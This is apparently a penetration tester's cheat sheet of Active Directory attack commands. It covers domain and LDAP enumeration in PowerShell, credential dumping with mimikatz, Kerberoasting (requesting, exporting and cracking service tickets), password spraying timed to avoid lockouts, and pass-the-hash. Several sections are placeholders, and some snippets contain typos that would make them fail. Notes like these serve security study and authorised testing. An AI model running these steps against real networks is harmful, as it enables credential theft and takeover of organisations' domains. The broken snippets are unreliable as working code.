# Active Directory

## Enumeration

### Built-in

* `net user`
* `net user /domain`
* `net user username /domain` (shows group membership)
* `net group /domain` (look for custom groups)

### TBD

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString = "LDAP://" + $PDC + "/" + $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
```

```
$Searcher.filter = "samAccountType=805306368"
' $Searcher.filter = "name=username"

$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
  ForEach($prop in $obj.Properties)
  {
    $prop
  }
  
  Write-Host "--------------------"
}
```

```
@Searcher.filter = "(objectGlaass=Group)"

$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
  $obj.Properties.name
}
```


```
@Searcher.filter = "(name=Some_Group)"

$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
  $obj.Properties.member
}
```
 
### TBD

`Import-Module .\PowerView.ps1`
* `Get-NewLoggedon -ComputerName computer123`
* `Get-NetSession -ComputerName domainController123`

### TBD

```
@Searcher.filter = "serviceprincipalname=*http*"

$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
  ForEach($prop in $obj.Properties)
  {
    $prop
  }
}
```
^^ of particular interest are `samaccountname` and `serviceprincipalname`

follow on (from target host):
```
nslookup website.domain.name
```

### TBD

```
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords   # NTLM, SHA1 are needed for pre Windows 2003
sekurlsa::tickets
```

### TBD

```
(PS) Add-Type -AssemblyName System.IdentityModel
(PS) New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '<SPN name>' # create SPN ticket
(PS) klist
```
```
mimikatz.exe
kerberos::list /export # download SPN ticket
```
(transfer .kerbi file to kali for use with kerberoast apt package)
```
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt <path_to_kirbi_file>
```

### Low & Slow Password Guessing

* `net accounts # see lockout threshold + lockout observation window (which gives one free login attempt)`
* `(PS) .\Spray-Passwords.ps1 -Pass <password> -Admin` (see https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1)

### Pass The Hash

* `pth-winexe -U <NTLM_hash> //hostip <cmd>` (see https://github.com/byt3bl33d3r/pth-toolkit)

### Overpass the hash

* 
